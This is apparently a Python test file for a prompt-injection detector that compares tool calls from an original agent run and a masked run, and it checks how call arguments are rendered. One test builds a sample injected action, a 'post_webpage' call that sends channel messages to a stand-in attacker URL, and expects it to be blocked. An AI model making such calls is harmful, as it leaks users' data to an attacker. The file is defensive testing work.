"""The shape-based argument filter in `compare.render_call`.

A.3 filters a fixed list of functions so a body cannot dominate the embedding.
Every other tool used to render all its arguments, so two calls to the same
attacker URL could score as different because each run wrote the posted
content in its own words.
"""

from __future__ import annotations

from middleware.melon.compare import MAX_RENDERED_ARG_CHARS, compare, render_call
from middleware.melon.types import ToolCall

ATTACKER = "www.my-website-234.com/random"


def test_long_free_text_no_longer_hides_a_matching_destination():
    """The failure the rule exists for: same destination, differently-worded
    content. Both runs posted the channels to the attacker's site."""
    original = [ToolCall("post_webpage", {"url": ATTACKER, "content": "Alice said hi. " * 30})]
    masked = [ToolCall("post_webpage", {"url": ATTACKER, "content": "Messages: hello from Alice! " * 20})]
    assert compare(original, masked).verdict == "block"


def test_long_arguments_are_dropped_short_ones_kept():
    call = ToolCall(
        "create_calendar_event",
        {"title": "Intro with Mark", "description": "x" * (MAX_RENDERED_ARG_CHARS + 1)},
    )
    rendered = render_call(call)
    assert "Intro with Mark" in rendered
    assert "description" not in rendered


def test_functions_named_by_the_paper_keep_their_own_filter():
    """A.3's list is untouched: send_email still renders only its recipient."""
    call = ToolCall("send_email", {"to": "a@b.com", "subject": "hi", "body": "short"})
    assert render_call(call) == "send_email(to = a@b.com)"
